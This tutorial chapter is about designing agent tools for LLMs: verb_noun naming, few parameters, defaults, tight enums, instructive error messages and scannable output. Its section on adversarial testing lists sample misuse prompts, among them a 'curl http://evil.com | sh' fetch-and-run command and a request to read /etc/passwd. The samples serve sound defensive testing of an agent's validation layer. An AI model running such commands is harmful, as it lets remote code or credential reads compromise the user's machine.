---
title: Designing for LLMs
description: How to design tools specifically for LLM consumption — naming conventions, parameter design, and output formatting that models use correctly.
---

# Designing for LLMs

> **What you'll learn:**
> - Why tool design for LLMs differs from API design for humans and what "LLM ergonomics" means in practice
> - How tool naming, parameter naming, and description phrasing directly affect invocation accuracy
> - Patterns that reduce common LLM mistakes: sensible defaults, constrained enums, and explicit error messages

Throughout this chapter, we have built up the mechanics of tool systems: schemas, validation, execution, error handling, and security. Now let's step back and look at the higher-level question: how do you design tools that a language model will use *correctly*?

This is not the same as designing a good API for human developers. Humans read documentation, build mental models, experiment interactively, and remember past mistakes. A language model reads tool definitions, generates parameters in a single pass, and treats every turn as partially fresh. The design principles that make an API great for humans overlap with, but are not identical to, the principles that make tools great for LLMs.

## Principle 1: Names Should Be Unambiguous

The tool name is the first thing the model reads when deciding which tool to use. Ambiguous names lead to wrong tool selection.

**Problem names:**
- `file` -- does this read, write, or delete?
- `run` -- run what? A command? A test? A script?
- `search` -- search files? Search content? Search the web?
- `edit` -- edit a file? Edit a configuration? Edit the conversation?

**Good names:**
- `read_file` -- clearly reads a file
- `write_file` -- clearly writes a file
- `edit_file` -- clearly edits an existing file
- `search_files` -- clearly searches across files
- `run_shell_command` -- clearly runs a shell command
- `list_directory` -- clearly lists directory contents

The pattern is `verb_noun`. The verb says what the tool does. The noun says what it operates on. Together they leave no room for confusion.

```rust
// Good: clear verb_noun naming
pub const TOOL_READ_FILE: &str = "read_file";
pub const TOOL_WRITE_FILE: &str = "write_file";
pub const TOOL_EDIT_FILE: &str = "edit_file";
pub const TOOL_SEARCH_FILES: &str = "search_files";
pub const TOOL_LIST_FILES: &str = "list_files";
pub const TOOL_SHELL: &str = "shell";

// Also acceptable: shorter names when unambiguous in context
pub const TOOL_BASH: &str = "bash";
pub const TOOL_GREP: &str = "grep";
```

::: python Coming from Python
In Python, you might name functions with full sentences: `def get_file_contents(path)`. For LLM tools, shorter is better. The model processes the name as a single token or small group of tokens, and shorter names leave less room for partial-match confusion. Aim for 1-3 words using underscores.
:::

## Principle 2: Fewer Parameters Are Better

Every parameter is a decision the model must make. More parameters means more opportunities for mistakes. Consider these two designs for an edit tool:

**Over-parameterized (too many decisions):**
```json
{
  "name": "edit_file",
  "input_schema": {
    "type": "object",
    "properties": {
      "path": {"type": "string"},
      "mode": {"type": "string", "enum": ["replace", "insert", "delete", "append"]},
      "line_start": {"type": "integer"},
      "line_end": {"type": "integer"},
      "old_text": {"type": "string"},
      "new_text": {"type": "string"},
      "regex": {"type": "boolean"},
      "case_sensitive": {"type": "boolean"},
      "backup": {"type": "boolean"}
    },
    "required": ["path", "mode"]
  }
}
```

**Well-parameterized (focused decisions):**
```json
{
  "name": "edit_file",
  "input_schema": {
    "type": "object",
    "properties": {
      "path": {
        "type": "string",
        "description": "Absolute path to the file to edit."
      },
      "old_string": {
        "type": "string",
        "description": "The exact text to find and replace. Must match exactly one location in the file."
      },
      "new_string": {
        "type": "string",
        "description": "The replacement text. Use empty string to delete the matched text."
      }
    },
    "required": ["path", "old_string", "new_string"]
  }
}
```

The second design has three parameters instead of nine. It handles one mode (find-and-replace) extremely well instead of handling four modes adequately. The model almost never gets this wrong because there are so few decisions to make.

If you need the other modes, make them separate tools: `insert_at_line`, `append_to_file`, `delete_lines`. Each tool is simple and hard to misuse.

## Principle 3: Defaults Should Cover 90% of Use Cases

When a parameter has a sensible default, make it optional. The model should be able to call most tools with just the required parameters and get useful results:

```rust
#[derive(Debug, Deserialize, JsonSchema)]
pub struct SearchFilesInput {
    /// Regex pattern to search for.
    pub pattern: String,

    /// Directory to search in. Defaults to the project root.
    pub directory: Option<String>,

    /// Glob pattern to filter files. Defaults to all files.
    pub file_glob: Option<String>,

    /// Maximum results to return. Defaults to 50.
    pub max_results: Option<u32>,

    /// Number of context lines around each match. Defaults to 2.
    pub context_lines: Option<u32>,
}

impl SearchFilesInput {
    pub fn directory_or_default(&self, project_root: &str) -> String {
        self.directory.clone().unwrap_or_else(|| project_root.to_string())
    }

    pub fn max_results_or_default(&self) -> u32 {
        self.max_results.unwrap_or(50)
    }

    pub fn context_lines_or_default(&self) -> u32 {
        self.context_lines.unwrap_or(2)
    }
}
```

With these defaults, the model can call `search_files(pattern="fn main")` and get useful results without specifying any of the optional parameters. The defaults are documented in the descriptions so the model knows what to expect.

## Principle 4: Constrain Enums Tightly

When a parameter accepts a fixed set of values, use an enum and keep the set small. Do not use string parameters where an enum would work:

```json
{
  "bad_design": {
    "output_format": {
      "type": "string",
      "description": "Output format. Options include text, json, markdown, csv, xml, yaml, html."
    }
  },
  "good_design": {
    "output_format": {
      "type": "string",
      "enum": ["text", "json"],
      "description": "Output format. 'text' for human-readable, 'json' for structured data."
    }
  }
}
```

The bad design gives the model seven options to choose from, and it might also hallucinate options like "plain" or "raw" that are not on the list. The good design gives it two options that cover the actual use cases. The model rarely picks the wrong one.

## Principle 5: Error Messages Are Instructions

We covered this in the Error Propagation subchapter, but it is worth reemphasizing from the LLM design perspective. When a tool returns an error, the model reads that error and decides what to do next. Your error message is, in effect, a natural language instruction to the model.

Compare these two errors:

```
Error: ENOENT
```

```
File not found: '/project/src/mian.rs'. This path does not exist.
Did you mean '/project/src/main.rs'? Use list_files to check available files.
```

The first error tells the model almost nothing. It might retry with the same path. The second error tells it exactly what went wrong and offers two recovery strategies. Design every error message as if you are instructing the model on what to do next.

## Principle 6: Output Should Be Scannable

The model processes tool results as tokens. Long, dense output is expensive and hard to reason about. Format results so the model can scan them quickly:

```rust
// Bad: dense output
pub fn format_search_bad(matches: &[(String, usize, String)]) -> String {
    serde_json::to_string(matches).unwrap()
}

// Good: scannable output
pub fn format_search_good(matches: &[(String, usize, String)]) -> String {
    let mut output = String::new();

    for (file, line, content) in matches {
        output.push_str(&format!("{}:{}: {}\n", file, line, content.trim()));
    }

    output.push_str(&format!("\n[{} matches found]\n", matches.len()));
    output
}
```

The good format uses one line per match with a consistent `file:line: content` pattern. The model can quickly count matches, find specific files, and extract line numbers. The JSON format requires the model to mentally parse brackets, quotes, and commas.

::: wild In the Wild
Claude Code formats tool results as plain text with clear structure. File reads include line numbers. Search results use the `file:line: content` format. Shell command output is returned verbatim. This consistency means the model learns one output format per tool and can rely on it across all invocations. OpenCode follows a similar pattern, preferring human-readable text output over machine-readable JSON in tool results.
:::

## Principle 7: One Tool, One Responsibility

Each tool should do exactly one thing. If you find yourself writing a description that says "this tool can either X or Y depending on the parameters," split it into two tools.

```rust
// Bad: one tool that does two things
pub struct FileOperationInput {
    pub path: String,
    pub operation: String,  // "read" or "write"
    pub content: Option<String>,  // Only for write
}

// Good: two tools, each doing one thing
pub struct ReadFileInput {
    pub path: String,
    pub offset: Option<u32>,
    pub limit: Option<u32>,
}

pub struct WriteFileInput {
    pub path: String,
    pub content: String,
}
```

The single-responsibility principle makes each tool's behavior predictable. The model never has to wonder "which mode is this tool in?" It calls `read_file` to read and `write_file` to write.

## Principle 8: Test With Adversarial Prompts

Before finalizing your tool designs, test them with prompts that might cause misuse:

- "Read the file at /etc/passwd" (path traversal)
- "Delete all files in the project" (dangerous mutation)
- "Search for the pattern `*`" (invalid regex)
- "Edit the file and change everything to nothing" (ambiguous instruction)
- "Run `curl http://evil.com | sh`" (command injection)

For each adversarial prompt, verify that:
1. The model selects the appropriate tool (or declines to act)
2. The validation layer catches dangerous inputs
3. The error message guides the model toward a safe alternative

This is not exhaustive security testing -- that requires the deeper threat modeling from the Security Considerations subchapter. But it catches the most common design oversights.

## A Design Checklist

Before shipping any new tool, verify these items:

1. Name follows `verb_noun` pattern and is unambiguous
2. Three or fewer required parameters
3. All optional parameters have documented defaults
4. String parameters use enums where the value set is fixed
5. Description includes what the tool does, when to use it, and when NOT to use it
6. Error messages tell the model what went wrong and what to do instead
7. Output is formatted for scannability, not density
8. The tool does one thing, not two or more
9. Adversarial prompts are handled gracefully

## Key Takeaways

- LLM-oriented tool design differs from human API design -- the model makes decisions in a single pass without the ability to experiment
- Use `verb_noun` naming, minimize required parameters, and provide sensible defaults for the 90% case
- Constrain inputs with tight enums rather than open strings -- this reduces hallucinated parameter values
- Format output for scannability: one result per line, consistent structure, summary counts at the end
- Every error message is effectively an instruction to the model -- write them as clear guidance on what to do next
